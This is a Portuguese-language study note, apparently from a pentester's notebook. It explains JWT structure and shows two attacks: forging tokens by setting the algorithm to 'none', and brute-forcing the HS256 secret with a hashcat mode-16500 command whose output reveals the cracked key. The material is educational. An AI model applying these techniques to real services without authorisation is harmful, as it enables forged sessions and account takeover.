JWT, ou JSON Web Token, é um padrão aberto (RFC 7519) para a transmissão segura de informações entre partes como um objeto JSON. Ele é usado principalmente em sistemas de autenticação e autorização, permitindo que as aplicações validem e confiem nas informações contidas no token, pois ele é assinado digitalmente.

Um JWT consiste em três partes separadas por pontos ( . ): 
1. **Header:**
    Contém informações sobre o tipo de token e o algoritmo de assinatura usado.
2. **Payload:**
    Contém as declarações (claims) sobre a entidade, como informações do usuário ou dados específicos da aplicação.
3. **Signature:**
    É a assinatura digital do token, usada para verificar sua autenticidade e integridade.

### Exploit
Podemos explorar um JWT de algumas formas, tomamos como exemplo o token : 
```js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im55Y29sYXNAand0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzQwMjEwNjIxLCJleHAiOjE3NDAyMTQyMjF9.bA2MSxmMfn8HEPJR60VRwr795NVmbY25Hk37_tjomjk
```

#### jwt.io
Podemos submetê-lo em um site faz a interpretação desse token. com o [jwt.io](http://jwt.io)

Aqui temos o token que submetemos.
![[Pasted image 20250627082838.png]]

Aqui temos o header, que especifica o algoritmo
![[Pasted image 20250627082909.png]]

Aqui temos a payload que é transmitida
![[Pasted image 20250627082926.png]]

E aqui temos a secret que é usada para a assinatura
![[Pasted image 20250627082940.png]]

#### Não validação do  algoritmo
Caso a aplicação não valide algoritmo, podemo defini-lo para `none` e tirar a parte da assinatura.
![[Pasted image 20250627084615.png]]

#### Quebra da assinatura
Podemos também fazer um brute force para tentar descobrir qual a chave usada para a assinatura. Podemos usar o hashcat no modo 16500 para quebra de token JWT. Vou utilizar a key `sensitivecontentpleasedontreadthxbyeforemployee` para fechar o JWT e a wordlist `Passwordsscraped-JWT-secrets.txt`

```sh
$ hashcat -m 16500 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im55Y29sYXNAand0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzQwMjEwNjIxLCJleHAiOjE3NDAyMTQyMjF9.nrHU0-7IBoavgmdSJcNJSwk6zyeBGcTZnUXNs-kp2nM' /usr/share/seclists/Passwords/scraped-JWT-secrets.txt

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
* Passwords.: 103965
* Bytes.....: 1127778
* Keyspace..: 103965

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im55Y29sYXNAand0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzQwMjEwNjIxLCJleHAiOjE3NDAyMTQyMjF9.nrHU0-7IBoavgmdSJcNJSwk6zyeBGcTZnUXNs-kp2nM:sensitivecontentpleasedontreadthxbyeforemployee
```